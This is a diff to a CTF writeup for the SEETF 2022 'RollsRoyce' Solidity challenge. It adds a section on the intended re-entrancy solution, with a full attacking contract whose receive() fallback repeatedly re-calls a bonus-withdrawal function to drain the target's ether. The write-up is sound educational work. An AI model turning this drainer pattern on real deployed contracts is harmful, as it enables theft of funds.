@@ -6,7 +6,8 @@
 
 RollsRoyce is the smart contract challenge that received the least solves during the CTF and it's not hard to guess that it might have something to do with the fact it involves guessing and randomness. Or does it really?
 
-EDIT: this apparently was an unintended solution. I guess not having any experience with exploiting Solidity gave me a different perspective on this challenge :)
+EDIT: my initial solution was apparently an unintended one. I guess not having any experience with exploiting Solidity gave me a different perspective on this challenge :)
+The intended one was a [re-entrancy attack](https://consensys.github.io/smart-contract-best-practices/attacks/reentrancy/), which is apparently a common attack vector against Ethereum smart contracts, and I added a section explaining how we can exploit it.
 
 #### Challenge description:
 > Let's have some fun and win some money and hopefully buy a Rolls-Royce!
@@ -301,6 +302,115 @@ Now all that remains is grabbing the flag:
 
 ![nc connection to server which returns the flag: `SEE{R4nd0m_R0yC3_6390bc0863295e58c2922f4fca50dab9}` ](https://cdn.hashnode.com/res/hashnode/image/upload/v1654469657028/fWb47J-oR.png align="center")
 
+
+# Intended solution
+
+After I published this writeup I learned that actually my solution wasn't the intended one and instead we were supposed to exploit [re-entrancy](https://consensys.github.io/smart-contract-best-practices/attacks/reentrancy/), which is a common vulnerability that I - due to this CTF being my first time even reading a smart contract - wasn't even familiar with. But now that I know this, let's solve it properly.
+
+Re-rentrancy depends on callbacks to the attacking contract recursively calling the target. We can see one such callback in the `sendValue` function:
+```solidity
+function sendValue(address payable recipient, uint256 amount) internal {
+        require(
+            address(this).balance >= amount,
+            "Address: insufficient balance"
+        );
+
+        (bool success, ) = recipient.call{value: amount}("");
+    }
+```
+Here, `recipient.call()` actually call the fallback `receive` function of the recipient. And since it's also a function, it can do more than just get money.
+
+Now we need to find the other part of reentrancy: some value that only gets set after the contract sends us money.
+
+We see that sendValue is internal, so it's definitely not it. The one function calling it is `withdrawPrizeMoney`, which seems promising...
+```solidity
+function withdrawPrizeMoney(address _to) public payable {
+        require(
+            msg.sender == _to,
+            "Only the player can withdraw the prize money"
+        );
+        require(
+            playerConsecutiveWins[_to] >= 3,
+            "You need to win 3 or more consecutive games to claim the prize money"
+        );
+
+        if (playerConsecutiveWins[_to] >= 3) {
+            uint prizeMoney = playerPool[_to];
+            playerPool[_to] = 0;
+            sendValue(payable(_to), prizeMoney);
+        }
+    }
+```
+And we can see that our `playerConsecutiveWins` isn't reset - so we can withdraw money multiple times even without reentrancy. Unfortunately, `playerPool` is reset, so after the first call we'll be withdrawing a grand total of 0 ether. Not really useful...
+
+But let's recall what we learned earlier: `withdrawPrizeMoney` isn't actually how we earn money, as by itself it can only get us back to our starting balance. Let's then look at `withdrawFirstWinPrizeMoneyBonus`:
+```solidity
+function withdrawFirstWinPrizeMoneyBonus() external {
+        require(
+            !claimedPrizeMoney[msg.sender],
+            "You have already claimed the first win bonus"
+        );
+        playerPool[msg.sender] += 1 ether;
+        withdrawPrizeMoney(msg.sender);
+        claimedPrizeMoney[msg.sender] = true;
+    }
+```
+And here we have 3 steps: we increment the pool, withdraw the money, and **then** make it so it can't be called by the same address again. We found our bug!
+
+Since our number of wins doesn't get reset, we as long as we call `withdrawFirstWinPrizeMoneyBonus` before `withdrawPrizeMoney` returns, we'll first get what we paid in + 1 ether, and then additional 1 ether with each call.
+
+We still need to get three wins though. Without exploiting the "random" number generator, we can just notice that it's not that hard to do statistically. It's 3 coin flips - so there are just 2³ equally possible permutations, which means just guessing heads has 1/8 chance of working, so we just need to try for a bit. It'll cost us some ether, but we'll get it back anyway :)
+
+Let's write the attacking contract then:
+```solidity
+contract IntendedSolution {
+    RollsRoyce public target;
+    constructor (address payable _target) payable {
+        target = RollsRoyce(_target);
+    }
+    function guess() public payable returns (uint) {
+        require(address(this).balance >= 1, "this contract needs at least 1 ether to work");
+        target.guess{value: 1 ether}(RollsRoyce.CoinFlipOption.HEAD);
+        target.revealResults();
+    }
+    function withdrawPrizeMoney() public {
+        target.withdrawFirstWinPrizeMoneyBonus();
+    }
+    receive() external payable {
+        if (address(target).balance > 0) {
+            withdrawPrizeMoney();
+        }
+    }
+    function getBackOurMoney(address payable recipient, uint256 amount) public {
+         (bool success, ) = recipient.call{value: amount}("");
+    }
+    function balance() public view returns (uint256) {
+        return address(this).balance;
+    }
+    function targetBalance() public view returns (uint256) {
+        return address(target).balance;
+    }
+}
+```
+
+Our `receive` fallback does what I described before: it calls the vulnerable function in our target again as long as it has ether left, getting 1 ether out in each all since the original one is still waiting on this callback to finish before setting `claimedPrizeMoney` to `true`.
+
+We can now just call `guess` a few times (remember to give it ether) until we see that our contract manages to get 3 wins - it can a bit tedious and expensive, but we'll get the money back later...
+
+Somehow, when writing this, I managed to get 3 wins on my first try though!
+
+![obraz.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1654522626278/F9gH5OytT.png align="center")
+
+Still, for now we've just added some ether to our target (the starting balance of this IntendedSolution contract was 12 ether):
+
+![obraz.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1654522644774/U57MOJ9D_.png align="center")
+
+But let's finally call our `withdrawPrizeMoney` funciton, and...
+
+![obraz.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1654522736231/fJYEYGcqH.png align="center")
+
+And now all that remains again is just getting the flag from the server:
+![obraz.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1654522777534/vEBGyhQKR.png align="center")
 
 
 > This is a writeup for [SEETF 2022](https://play.seetf.sg/) which I participated in as a member of [DistributedLivelock](https://ctftime.org/team/187094) team. You can find my other writeups for this CTF [here](https://blog.opliko.dev/series/seetf-2022)
